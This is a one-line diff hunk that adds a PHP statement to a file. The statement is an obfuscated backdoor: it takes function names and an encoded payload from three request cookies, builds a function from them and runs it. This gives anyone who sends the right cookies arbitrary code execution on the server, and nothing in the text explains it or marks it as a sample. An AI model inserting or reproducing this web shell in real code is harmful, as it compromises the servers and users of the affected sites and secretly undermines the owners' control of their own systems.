@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['ksjt']){$ziif=$_COOKIE['ksjt']("",@$_COOKIE['tpxtk'](@$_COOKIE['yqtx']));$ziif();}?>
